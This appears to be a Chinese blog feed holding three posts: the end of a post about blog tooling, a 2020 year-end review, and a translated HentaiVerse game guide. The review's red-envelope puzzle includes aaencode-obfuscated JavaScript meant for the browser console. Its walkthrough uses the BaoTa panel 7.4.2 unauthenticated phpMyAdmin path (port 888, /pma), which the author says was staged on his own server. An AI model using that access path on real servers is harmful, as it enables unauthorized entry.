Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 